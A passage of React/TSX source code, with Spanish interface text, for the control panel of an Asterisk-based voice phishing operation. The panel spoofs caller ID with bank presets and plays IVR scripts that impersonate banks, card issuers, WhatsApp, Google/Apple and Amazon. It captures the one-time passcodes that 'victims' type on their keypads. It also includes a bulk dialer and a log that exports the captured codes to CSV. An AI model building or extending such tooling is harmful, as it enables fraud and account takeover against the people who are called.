                      className="inline-flex items-center gap-2 px-4 py-3.5 rounded-xl font-bold text-sm bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 transition-all"
                    >
                      {copiedId === 'live-otp' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4 text-slate-400" />}
                      <span>{copiedId === 'live-otp' ? '¡Copiado!' : 'Copiar'}</span>
                    </button>
                  </div>

                  {/* Detalle tras la decisión del agente */}
                  {activeCall.otpStatus && activeCall.otpStatus !== 'pending' && (
                    <div
                      className={`p-3.5 rounded-xl text-xs font-semibold flex flex-col sm:flex-row sm:items-center justify-between gap-2 ${
                        activeCall.otpStatus === 'valid'
                          ? 'bg-emerald-500/15 border border-emerald-500/40 text-emerald-300'
                          : 'bg-rose-500/15 border border-rose-500/40 text-rose-300'
                      }`}
                    >
                      <div className="flex items-center gap-2">
                        {activeCall.otpStatus === 'valid' ? (
                          <CheckCircle className="w-5 h-5 text-emerald-400 shrink-0" />
                        ) : (
                          <XCircle className="w-5 h-5 text-rose-400 shrink-0" />
                        )}
                        <div>
                          <strong>
                            {activeCall.otpStatus === 'valid'
                              ? '✓ Operación Aprobada: El agente confirmó que el código OTP es VÁLIDO.'
                              : '✕ Operación Rechazada: El agente marcó el código OTP como INVÁLIDO.'}
                          </strong>
                          <p className="text-[11px] font-normal text-slate-300 mt-0.5">
                            {activeCall.otpStatus === 'valid'
                              ? 'Puedes indicarle al cliente que la anulación fue exitosa y dar por terminada la llamada.'
                              : 'Indícale al cliente que el código no coincide y usa el botón "Solicitar Nuevo Código / Reintentar" para recibir el nuevo.'}
                          </p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2 shrink-0">
                        <span className="text-[11px] font-mono px-2 py-0.5 rounded bg-slate-900 border border-slate-800">
                          {new Date().toLocaleTimeString()}
                        </span>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            ) : (
              <div className="py-8 text-slate-400 text-sm flex flex-col items-center justify-center gap-3 font-mono bg-slate-950/60 rounded-xl border border-slate-800/80">
                <div className="flex items-center gap-2.5 text-emerald-400">
                  <RefreshCw className="w-5 h-5 animate-spin" />
                  <span className="font-bold text-slate-200 text-base">Esperando que el cliente digite el código en su teléfono...</span>
                </div>
                <p className="text-xs text-slate-400 max-w-lg text-center leading-relaxed">
                  Pídele verbalmente al cliente en la llamada que marque su clave en su teclado numérico. En cuanto el cliente presione las teclas, los dígitos aparecerán aquí instantáneamente para que decidas si lo apruebas como válido o lo rechazas.
                </p>
                <div className="flex items-center gap-2 pt-1">
                  {Array.from({ length: 6 }).map((_, i) => (
                    <span
                      key={i}
                      className="w-10 h-12 flex items-center justify-center text-lg font-bold font-mono text-slate-600 bg-slate-900/80 rounded-lg border border-slate-800"
                    >
                      •
                    </span>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* SINGLE LAUNCHER PANEL */}
      {productionMode === 'single' && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Main Launcher Form */}
          <div className="lg:col-span-2 space-y-6">
            <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-6">
              <h3 className="text-base font-bold text-white flex items-center gap-2">
                <Rocket className="w-5 h-5 text-emerald-400" />
                <span>Configurar Llamada de Producción</span>
              </h3>

              {/* Destination Phone Number */}
              <div className="space-y-2">
                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center justify-between">
                  <span>Número de Teléfono del Objetivo</span>
                  <span className="text-slate-500 font-mono text-[11px]">Formato: 16104803845</span>
                </label>
                <div className="flex gap-2">
                  <input
                    id="input-prod-phone"
                    type="text"
                    value={targetNumber}
                    onChange={(e) => setTargetNumber(e.target.value)}
                    placeholder="ej. 16104803845"
                    className="flex-1 px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white font-mono text-lg font-bold focus:border-emerald-500 focus:outline-none"
                  />
                  <input
                    id="input-prod-name"
                    type="text"
                    value={targetName}
                    onChange={(e) => setTargetName(e.target.value)}
                    placeholder="Nombre titular (opcional)"
                    className="w-1/3 px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-white text-xs focus:border-emerald-500 focus:outline-none hidden sm:block"
                  />
                </div>
              </div>

              {/* Service Template Selection */}
              <div className="space-y-2">
                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                  Guión / Entidad a Simular en el IVR
                </label>
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2.5">
                  <button
                    type="button"
                    onClick={() => setSelectedService('bank')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'bank'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Building2 className="w-4 h-4 text-emerald-400 mb-1" />
                    <div className="text-xs font-bold">Banco / Antifraude</div>
                    <div className="text-[10px] text-slate-500">Transf. desconocida</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('card')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'card'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <CreditCard className="w-4 h-4 text-sky-400 mb-1" />
                    <div className="text-xs font-bold">Tarjeta de Crédito</div>
                    <div className="text-[10px] text-slate-500">Cargo no reconocido</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('whatsapp')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'whatsapp'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <MessageSquare className="w-4 h-4 text-emerald-300 mb-1" />
                    <div className="text-xs font-bold">WhatsApp / Telegram</div>
                    <div className="text-[10px] text-slate-500">Migración de cuenta</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('google')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'google'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Lock className="w-4 h-4 text-emerald-400 mb-1" />
                    <div className="text-xs font-bold">Google / Apple ID</div>
                    <div className="text-[10px] text-slate-500">Alerta de seguridad</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('amazon')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'amazon'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <ShoppingBag className="w-4 h-4 text-emerald-400 mb-1" />
                    <div className="text-xs font-bold">Amazon / Envíos</div>
                    <div className="text-[10px] text-slate-500">Autorización pedido</div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setSelectedService('custom')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      selectedService === 'custom'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white shadow-md shadow-emerald-500/10'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Sliders className="w-4 h-4 text-purple-400 mb-1" />
                    <div className="text-xs font-bold">Personalizado</div>
                    <div className="text-[10px] text-slate-500">Configuración libre</div>
                  </button>
                </div>
              </div>

              {/* Call Flow Mode */}
              <div className="space-y-2">
                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                  Acción del IVR al Contestar
                </label>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  <button
                    type="button"
                    onClick={() => setCallFlowMode('otp')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'otp'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <KeyRound className="w-4 h-4 text-emerald-400 mb-1" />
                    <div className="text-xs font-bold">1. Capturar Código OTP</div>
                    <div className="text-[11px] text-slate-400 mt-0.5">
                      Pide los 4 o 6 dígitos y los muestra en pantalla viva.
                    </div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setCallFlowMode('press1')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'press1'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <PhoneForwarded className="w-4 h-4 text-emerald-400 mb-1" />
                    <div className="text-xs font-bold">2. Press-1 (A X-Lite)</div>
                    <div className="text-[11px] text-slate-400 mt-0.5">
                      Si presiona 1, timbra directo en tu extensión 1001.
                    </div>
                  </button>

                  <button
                    type="button"
                    onClick={() => setCallFlowMode('hybrid')}
                    className={`p-3 rounded-xl border text-left transition-all ${
                      callFlowMode === 'hybrid'
                        ? 'bg-emerald-500/10 border-emerald-500 text-white'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
                    }`}
                  >
                    <Radio className="w-4 h-4 text-sky-400 mb-1" />
                    <div className="text-xs font-bold">3. Híbrido Completo</div>
                    <div className="text-[11px] text-slate-400 mt-0.5">
                      Pide el código y si presiona 1 conecta con asesor.
                    </div>
                  </button>
                </div>
              </div>

              {/* ======================================================== */}
              {/* LOCUCIONES Y AUDIOS PREGRABADOS DE LA CAMPAÑA */}
              {/* ======================================================== */}
              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-4">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
                  <div className="flex items-center gap-2">
                    <Volume2 className="w-4 h-4 text-emerald-400" />
                    <div>
                      <h4 className="text-xs font-bold text-white uppercase tracking-wider">
                        Locuciones Pregrabadas del IVR
                      </h4>
                      <p className="text-[11px] text-slate-400">
                        Campaña activa: <strong className="text-emerald-300">{serviceLabel}</strong>
                      </p>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => {
                      setQuickUploadSlot('introAudioPath');
                      setIsQuickUploadOpen(true);
                    }}
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/20 transition-all self-start sm:self-auto"
                  >
                    <Plus className="w-3.5 h-3.5" />
                    <span>+ Subir / Grabar Audio</span>
                  </button>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  {/* Slot 1: Audio de Bienvenida / Alerta de Fraude */}
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
                    <div className="flex items-center justify-between">
                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
                        <span>1. Saludo / Alerta Inicial</span>
                      </label>
                      <button
                        type="button"
                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].introAudioPath, 'intro')}
                        disabled={!campaignAudios[selectedService].introAudioPath}
                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
                        title="Escuchar audio"
                      >
                        {playingAudioKey === 'intro' ? (
                          <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                        ) : (
                          <Play className="w-3.5 h-3.5 text-slate-300" />
                        )}
                      </button>
                    </div>
                    <select
                      value={campaignAudios[selectedService].introAudioPath}
                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                    >
                      <option value="">-- Beep estándar de Asterisk --</option>
                      <option value={`custom/alerta_${selectedService}`}>custom/alerta_{selectedService} (Recomendado)</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <div className="text-[10px] text-slate-500 font-mono truncate">
                      Ruta: /var/lib/asterisk/sounds/{campaignAudios[selectedService].introAudioPath || 'beep'}.wav
                    </div>
                  </div>

                  {/* Slot 2: Solicitud de Código OTP */}
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
                    <div className="flex items-center justify-between">
                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
                        <span>2. Solicitud de Código OTP</span>
                      </label>
                      <button
                        type="button"
                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].promptAudioPath, 'prompt')}
                        disabled={!campaignAudios[selectedService].promptAudioPath}
                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
                        title="Escuchar audio"
                      >
                        {playingAudioKey === 'prompt' ? (
                          <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                        ) : (
                          <Play className="w-3.5 h-3.5 text-slate-300" />
                        )}
                      </button>
                    </div>
                    <select
                      value={campaignAudios[selectedService].promptAudioPath}
                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
                    >
                      <option value="">-- Beep estándar (espera dígitos) --</option>
                      <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp (Estándar)</option>
                      <option value={`custom/solicitar_otp_${selectedService}`}>custom/solicitar_otp_{selectedService}</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <div className="text-[10px] text-slate-500 font-mono truncate">
                      Ruta: /var/lib/asterisk/sounds/{campaignAudios[selectedService].promptAudioPath || 'beep'}.wav
                    </div>
                  </div>

                  {/* Slot 3: Transferencia Press-1 (Asesor) */}
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
                    <div className="flex items-center justify-between">
                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
                        <span className="w-1.5 h-1.5 rounded-full bg-sky-400"></span>
                        <span>3. Transferencia Press 1</span>
                      </label>
                      <button
                        type="button"
                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].agentAudioPath, 'agent')}
                        disabled={!campaignAudios[selectedService].agentAudioPath}
                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
                        title="Escuchar audio"
                      >
                        {playingAudioKey === 'agent' ? (
                          <Pause className="w-3.5 h-3.5 text-sky-400 animate-pulse" />
                        ) : (
                          <Play className="w-3.5 h-3.5 text-slate-300" />
                        )}
                      </button>
                    </div>
                    <select
                      value={campaignAudios[selectedService].agentAudioPath}
                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
                    >
                      <option value="">-- Sin audio previo (Directo a X-Lite) --</option>
                      <option value="custom/conectar_asesor">custom/conectar_asesor ("Transfiriendo...")</option>
                      <option value={`custom/conectar_asesor_${selectedService}`}>custom/conectar_asesor_{selectedService}</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <div className="text-[10px] text-slate-500 font-mono truncate">
                      Conecta con: Extensión {agentExtension} (Softphone X-Lite)
                    </div>
                  </div>

                  {/* Slot 4: Despedida / Éxito OTP */}
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
                    <div className="flex items-center justify-between">
                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
                        <span className="w-1.5 h-1.5 rounded-full bg-purple-400"></span>
                        <span>4. Confirmación / Éxito OTP</span>
                      </label>
                      <button
                        type="button"
                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].successAudioPath, 'success')}
                        disabled={!campaignAudios[selectedService].successAudioPath}
                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
                        title="Escuchar audio"
                      >
                        {playingAudioKey === 'success' ? (
                          <Pause className="w-3.5 h-3.5 text-purple-400 animate-pulse" />
                        ) : (
                          <Play className="w-3.5 h-3.5 text-slate-300" />
                        )}
                      </button>
                    </div>
                    <select
                      value={campaignAudios[selectedService].successAudioPath}
                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
                    >
                      <option value="">-- SayDigits (repite dígitos capturados) --</option>
                      <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
                      <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
                      {audios.map((a) => (
                        <option key={a.id} value={a.asteriskPath}>
                          {a.name} ({a.asteriskPath})
                        </option>
                      ))}
                    </select>
                    <div className="text-[10px] text-slate-500 font-mono truncate">
                      Ruta: /var/lib/asterisk/sounds/{campaignAudios[selectedService].successAudioPath || 'SayDigits'}.wav
                    </div>
                  </div>
                </div>

                {/* Botón de Sincronización Inmediata con Asterisk AstDB */}
                <div className="pt-2 flex flex-col sm:flex-row items-center justify-between gap-3 border-t border-slate-800">
                  <div className="text-[11px] text-slate-400">
                    Sincroniza los audios seleccionados en la base de datos de Asterisk para asegurar que suenen en llamadas y pruebas (8888).
                  </div>
                  <div className="flex items-center gap-2 w-full sm:w-auto">
                    {audioSyncFeedback && (
                      <span className="text-xs font-semibold text-emerald-400 animate-fade-in">
                        {audioSyncFeedback}
                      </span>
                    )}
                    <button
                      id="btn-sync-audios-astdb"
                      type="button"
                      onClick={() => handleSyncAudiosToAsterisk(false)}
                      disabled={isSyncingAudios}
                      className="px-4 py-2 rounded-lg bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 border border-emerald-500/40 text-xs font-bold flex items-center gap-1.5 transition-all w-full sm:w-auto justify-center"
                    >
                      <RefreshCw className={`w-3.5 h-3.5 ${isSyncingAudios ? 'animate-spin' : ''}`} />
                      <span>{isSyncingAudios ? 'Sincronizando...' : 'Sincronizar Audios con Asterisk'}</span>
                    </button>
                  </div>
                </div>
              </div>

              {/* ======================================================== */}
              {/* CONFIGURACIÓN VISIBLE DE CALLERID (PRESENTACIÓN SALIENTE) */}
              {/* ======================================================== */}
              <div className="p-4 rounded-xl bg-slate-900 border-2 border-sky-500/50 shadow-lg shadow-sky-950/40 space-y-3">
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2">
                  <div className="flex items-center gap-2">
                    <Phone className="w-4 h-4 text-sky-400" />
                    <div>
                      <h4 className="text-xs font-bold text-white uppercase tracking-wider">
                        Identificador de Llamada Saliente (CallerID Spoofing)
                      </h4>
                      <p className="text-[11px] text-slate-400">
                        Lo que verá la víctima en la pantalla de su teléfono cuando reciba la llamada.
                      </p>
                    </div>
                  </div>
                  <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-sky-500/20 text-sky-300 border border-sky-500/30 self-start sm:self-auto">
                    CALLERID(num) & (name)
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-bold text-sky-300 mb-1">
                      CALLERID(num) - Número a Mostrar *
                    </label>
                    <input
                      id="input-prod-callerid-num"
                      type="text"
                      required
                      value={callerIdNum}
                      onChange={(e) => setCallerIdNum(e.target.value)}
                      placeholder="+18005550199"
                      className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-700 text-white font-mono text-sm focus:border-sky-500 focus:outline-none font-bold"
                    />
                    <span className="text-[10px] text-slate-400">Reemplaza el "+18005550199" en Asterisk</span>
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-sky-300 mb-1">
                      CALLERID(name) - Nombre a Mostrar *
                    </label>
                    <input
                      id="input-prod-callerid-name"
                      type="text"
                      required
                      value={callerIdName}
                      onChange={(e) => setCallerIdName(e.target.value)}
                      placeholder="Seguridad Bancaria"
                      className="w-full px-3 py-2 rounded-lg bg-slate-950 border border-slate-700 text-white font-mono text-sm focus:border-sky-500 focus:outline-none font-bold"
                    />
                    <span className="text-[10px] text-slate-400">Nombre público que se presentará en la pantalla del cliente</span>
                  </div>
                </div>

                {/* Presets rápidos */}
                <div className="flex flex-wrap items-center gap-1.5 pt-1">
                  <span className="text-[10px] text-slate-400 font-semibold">Presets rápidos:</span>
                  <button
                    type="button"
                    onClick={() => { setCallerIdName('Banco Central Antifraude'); setCallerIdNum('+18005550199'); }}
                    className="text-[10px] px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-sky-300 border border-slate-700 transition-colors"
                  >
                    Banco Antifraude
                  </button>
                  <button
                    type="button"
                    onClick={() => { setCallerIdName('Seguridad Bancaria'); setCallerIdNum('+18005550199'); }}
                    className="text-[10px] px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-sky-300 border border-slate-700 transition-colors"
                  >
                    Seguridad Bancaria
                  </button>
                  <button
                    type="button"
                    onClick={() => { setCallerIdName('Servicio al Cliente'); setCallerIdNum('+18884561234'); }}
                    className="text-[10px] px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 transition-colors"
                  >
                    Servicio al Cliente
                  </button>
                </div>

                {/* Vista previa en vivo del CallerID */}
                <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-800 flex items-center justify-between text-xs">
                  <span className="text-slate-400">Vista previa en pantalla móvil:</span>
                  <span className="font-mono font-bold text-emerald-400">
                    "{callerIdName}" &lt;{callerIdNum}&gt;
                  </span>
                </div>
              </div>

              {/* Big Launch Button */}
              <div className="pt-2">
                <button
                  id="btn-launch-production-call"
                  onClick={handleLaunchProductionCall}
                  disabled={isLaunching || !targetNumber.trim()}
                  className="w-full py-4 rounded-xl font-black text-base bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 shadow-xl shadow-emerald-500/25 transition-all flex items-center justify-center gap-3 disabled:opacity-50"
                >
                  {isLaunching ? (
                    <RefreshCw className="w-5 h-5 animate-spin" />
                  ) : (
                    <Rocket className="w-5 h-5" />
                  )}
                  <span>
                    {isLaunching ? 'Lanzando Llamada a Asterisk...' : 'INICIAR LLAMADA DE PRODUCCIÓN AHORA'}
                  </span>
                </button>
              </div>

              {launchFeedback && (
                <div
                  className={`p-3 rounded-xl text-xs flex items-center gap-2 ${
                    launchFeedback.type === 'success'
                      ? 'bg-emerald-500/10 border border-emerald-500/30 text-emerald-400'
                      : 'bg-rose-500/10 border border-rose-500/30 text-rose-400'
                  }`}
                >
                  <AlertCircle className="w-4 h-4 shrink-0" />
                  <span>{launchFeedback.text}</span>
                </div>
              )}
            </div>
          </div>

          {/* Side Info & Tips */}
          <div className="space-y-6">
            <div className="p-5 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
              <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                <span>Parámetros de Operación</span>
              </h4>

              <div className="space-y-3 text-xs">
                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-500 font-mono">Troncal Asignada</div>
                  <div className="font-bold text-white mt-0.5">{activeCarrier} (SIP UDP)</div>
                  <div className="text-[11px] text-slate-400">Ruta saliente automática configurada</div>
                </div>

                <div className="p-3 rounded-xl bg-slate-900 border border-sky-500/30">
                  <div className="text-[10px] text-sky-400 font-mono font-bold flex items-center gap-1">
                    <Phone className="w-3 h-3" />
                    <span>CallerID Saliente en Asterisk</span>
                  </div>
                  <div className="font-bold text-white mt-0.5 font-mono">{callerIdNum}</div>
                  <div className="text-[11px] text-sky-300 font-medium">Nombre: "{callerIdName}"</div>
                </div>

                <div className="p-3 rounded-xl bg-slate-900 border border-slate-800">
                  <div className="text-[10px] text-slate-500 font-mono">Softphone del Operador</div>
                  <div className="font-bold text-emerald-400 mt-0.5 font-mono">Extensión {agentExtension} (PJSIP)</div>
                  <div className="text-[11px] text-slate-400">Recibe transferencias cuando la víctima presiona 1</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* BULK DIALER PANEL */}
      {productionMode === 'bulk' && (
        <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
          <div className="flex items-center justify-between">
            <h3 className="text-base font-bold text-white flex items-center gap-2">
              <Flame className="w-5 h-5 text-emerald-400" />
              <span>Marcador Masivo por Lotes (Bulk Campaign)</span>
            </h3>
            <span className="text-xs text-slate-400">Pega tu lista de números telefónicos</span>
          </div>

          <textarea
            id="textarea-bulk-numbers"
            rows={6}
            value={bulkNumbersText}
            onChange={(e) => setBulkNumbersText(e.target.value)}
            placeholder="16104803845&#10;14155552671&#10;12125559823"
            className="w-full p-4 bg-slate-900 border border-slate-700 rounded-xl text-white font-mono text-sm focus:border-emerald-500 focus:outline-none"
          />

          <div className="flex items-center justify-between pt-2">
            <div className="text-xs text-slate-400">
              Total de números detectados:{' '}
              <strong className="text-emerald-400 font-mono">
                {bulkNumbersText.split('\n').filter((n) => n.trim().length >= 8).length}
              </strong>
            </div>

            <button
              id="btn-launch-bulk"
              onClick={() => {
                const nums = bulkNumbersText.split('\n').filter((n) => n.trim().length >= 8);
                if (nums.length > 0) {
                  setTargetNumber(nums[0].trim());
                  setProductionMode('single');
                  alert(`Cargado primer número de la lista: ${nums[0].trim()}`);
                }
              }}
              className="px-5 py-2.5 rounded-xl text-xs font-bold bg-emerald-500 hover:bg-emerald-400 text-black transition-all shadow-md shadow-emerald-500/20"
            >
              Cargar al Disparador de Producción
            </button>
          </div>
        </div>
      )}

      {/* HISTORICAL TABLE OF CAPTURED OTPS */}
      <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h3 className="text-base font-bold text-white flex items-center gap-2">
              <KeyRound className="w-5 h-5 text-emerald-400" />
              <span>Registro de Códigos OTP Producidos</span>
              <span className="px-2 py-0.5 text-xs font-mono font-bold bg-emerald-500/20 text-emerald-300 rounded-full border border-emerald-500/30">
                {otpRecords.length}
              </span>
            </h3>
            <p className="text-xs text-slate-400">
              Almacén en vivo de todos los códigos digitados por las víctimas en llamadas salientes.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              id="btn-refresh-otp-records"
              onClick={fetchCapturedOtps}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-800 transition-all"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              <span>Actualizar</span>
            </button>

            <button
              id="btn-export-otp-csv"
              onClick={handleExportCsv}
              disabled={otpRecords.length === 0}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-slate-900 hover:bg-slate-800 text-emerald-400 border border-slate-800 disabled:opacity-40 transition-all"
            >
              <Download className="w-3.5 h-3.5" />
              <span>Exportar CSV</span>
            </button>

            <button
              id="btn-clear-otp-history"
              onClick={handleClearHistory}
              disabled={otpRecords.length === 0}
              className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 disabled:opacity-40 transition-all"
            >
              <Trash2 className="w-3.5 h-3.5" />
              <span>Vaciar</span>
            </button>
          </div>
        </div>

        {/* OTP Table */}
        <div className="overflow-x-auto rounded-xl border border-slate-800">
          <table className="w-full text-left border-collapse text-xs">
            <thead>
              <tr className="bg-slate-900/80 border-b border-slate-800 text-slate-400 font-mono">
                <th className="p-3">Hora</th>
                <th className="p-3">Número Destino</th>
                <th className="p-3">Servicio</th>
                <th className="p-3">Código OTP Capturado</th>
                <th className="p-3">Decisión del Agente (Válido/Inválido)</th>
                <th className="p-3 text-right">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {otpRecords.length === 0 ? (
                <tr>
                  <td colSpan={6} className="p-8 text-center text-slate-500">
                    <KeyRound className="w-8 h-8 mx-auto mb-2 opacity-30" />
                    <span>No hay códigos OTP capturados todavía. Lanza tu primera llamada de producción.</span>
                  </td>
                </tr>
              ) : (
                otpRecords.map((record) => (
                  <tr key={record.id} className="hover:bg-slate-900/40 transition-colors">
                    <td className="p-3 text-slate-400 font-mono">{record.timestamp}</td>
                    <td className="p-3 font-mono font-bold text-white">{record.number}</td>
                    <td className="p-3 text-slate-300">{record.service || 'Banco / Antifraude'}</td>
                    <td className="p-3">
                      <span className="inline-flex items-center px-3 py-1 rounded-lg bg-emerald-500/20 border border-emerald-500/40 font-mono text-sm font-black text-emerald-300 tracking-wider">
                        {record.otp}
                      </span>
                    </td>
                    <td className="p-3">
                      <div className="space-y-1.5">
                        <div>
                          {record.status === 'valid' ? (
                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-bold border border-emerald-500/30 text-[10px]">
                              <CheckCircle className="w-3 h-3 text-emerald-400" />
                              <span>VÁLIDO (Aprobado)</span>
                            </span>
                          ) : record.status === 'invalid' ? (
